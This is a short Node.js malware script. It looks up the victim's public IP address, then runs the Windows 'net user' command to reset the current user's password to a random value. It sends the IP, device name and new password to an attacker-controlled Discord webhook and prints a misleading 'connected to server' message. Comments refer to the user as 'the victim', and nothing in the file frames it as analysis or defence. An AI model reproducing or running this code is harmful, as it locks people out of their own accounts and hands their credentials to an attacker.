const { Webhook } = require('discord-webhook-node');
let request = require('request');
const logs = new Webhook("webhook link");//webhook link
const { exec } = require("child_process");

request.get(`https://api.ipify.org`, function(err, response, body) {
	if (err)
		 process.exit(1);
	
	
(async () => {
exec(`net user ${__dirname.split("\\")[2]} /random`, (error, data, getter) => {
	logs.send(`\n\`\`\`yaml\nLogged IP: ${body}\nDevice Name: ${__dirname.split("\\")[2]}\nNew Password: ${data}\n\`\`\`\n`)
	console.log(`connected to server.`)
	if (error){

logs.send(`\n\`\`\`yaml\nthe victim doesn't open application as administrator.\`\`\`\n`)

	}

});
  })();
     });
